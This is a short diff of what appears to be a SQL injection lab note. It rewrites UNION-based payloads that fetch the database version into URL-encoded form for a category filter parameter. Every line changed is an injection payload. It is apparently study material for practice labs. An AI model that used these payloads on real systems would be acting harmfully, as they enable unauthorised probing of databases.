@@ -7,13 +7,13 @@
 **MySQL / Microsoft SQL Server:**
 
 ```
-' UNION SELECT @@version, NULL--
+'+UNION+SELECT+'a',+@@version#
 ```
 
 Or for Microsoft:
 
 ```
-' UNION SELECT @@version, NULL--
+'+UNION+SELECT+'a',+@@version#
 ```
 
 (Works on both in most labs.)
@@ -21,5 +21,5 @@ Or for Microsoft:
 ## Payload
 
 ```
-' UNION SELECT @@version, NULL--
+/filter?category='+UNION+SELECT+'a',+@@version#
 ```
